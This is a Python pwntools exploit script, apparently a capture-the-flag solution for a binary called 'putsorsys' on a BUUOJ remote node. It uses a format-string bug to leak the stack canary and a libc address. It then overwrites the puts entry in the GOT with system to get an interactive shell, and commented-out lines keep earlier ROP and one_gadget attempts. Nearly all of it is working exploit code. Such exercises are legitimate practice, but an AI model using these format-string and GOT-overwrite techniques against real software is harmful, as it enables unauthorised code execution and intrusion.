'''
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)

system("/bin/sh") and one_gadget are both not working
one_gadget is not working because of the rbp address is not writable
about system("/bin/sh") is not working don't know why ...

1. leak canary value
2. leak libc address
3. fmtstr vuln to overwrite got table puts to libc system
'''

from pwn import *
# from LibcSearcher import *


local = 0
url, port = "node5.buuoj.cn", "27003" 
filename = "./putsorsys"
elf = ELF(filename)
local_libc = "/home/fa1c4/Desktop/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6"
remote_libc = "./libc.so.6"
libc = ELF(local_libc if local else remote_libc)
context(arch="amd64", os="linux")
# context(arch="i386", os="linux")

if local:
    context.log_level = "debug"
    io = process(filename)
    context.terminal = ['tmux', 'splitw', '-h']
    # gdb.attach(io)
else:
    io = remote(url, port)

# pop_rdi_ret_relative_addr = 0x000000000002a3e5
# ret_addr = 0x000000000040101a
puts_got_addr = elf.got['puts']

def B():
    gdb.attach(io)
    pause()

def pwn():
    io.sendlineafter(b'Give me some gift?(0/1)\n', b'1')
    # io.sendlineafter(b"What's it", b'ffffffff%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|') # 8 ordinal num
    # (0x7ffebe94b318 - 0x7ffebe94b240) / 8 == 27
    io.sendlineafter(b"What's it", b'%13$p|%35$p|')
    # io.sendlineafter(b"What's it", b'%6$p|%13$p|%35$p|')
    # io.sendlineafter(b"What's it", b'%13$p|%14$p|%35$p|')
    io.recvuntil(b'There is my gift:\n')
    # rsp_value = int(io.recvuntil(b'|', drop=True), 16)
    canary_value = int(io.recvuntil(b'|', drop=True), 16)
    # rbp_value = int(io.recvuntil(b'|', drop=True), 16)
    libc_start_main_addr = int(io.recvuntil(b'|', drop=True), 16) - 128
    # log.info(f'rsp_value: {hex(rsp_value)}')
    log.info(f'canary_value: {hex(canary_value)}')
    # log.info(f'rbp value: {hex(rbp_value)}')
    log.info(f'libc_start_main_addr: {hex(libc_start_main_addr)}')

    libc.address = libc_start_main_addr - libc.sym['__libc_start_main']
    system_addr = libc.sym['system']
    
    # binsh_addr = libc.address + next(libc.search(b'/bin/sh\x00')) # no need to plus libc.address
    # binsh_addr = next(libc.search(b'/bin/sh\x00'))
    # pop_rdi_ret_addr = libc.address + pop_rdi_ret_relative_addr
    # 0xebcf1 0xebcf5 0xebcf8 0xebd52 0xebda8 0xebdaf 0xebdb3
    # one_gadget_addr = libc.address + 0xebdb3 

    # send payload to stack overflow
    io.sendlineafter(b'Give me some gift?(0/1)\n', b'1')
    # payload = cyclic(40) + p64(canary_value) + p64(rsp_value) # + p64(rbp_value) # + p64(ret_addr)
    # payload += p64(pop_rdi_ret_addr) + p64(binsh_addr) + p64(system_addr)
    # payload += p64(one_gadget_addr)

    payload = fmtstr_payload(8, {puts_got_addr: system_addr})
    # print(payload)
    io.sendlineafter(b"What's it\n", payload)
    # io.sendlineafter(b'Give me some gift?(0/1)\n', b'0')


if __name__ == "__main__":
    pwn()
    io.interactive()
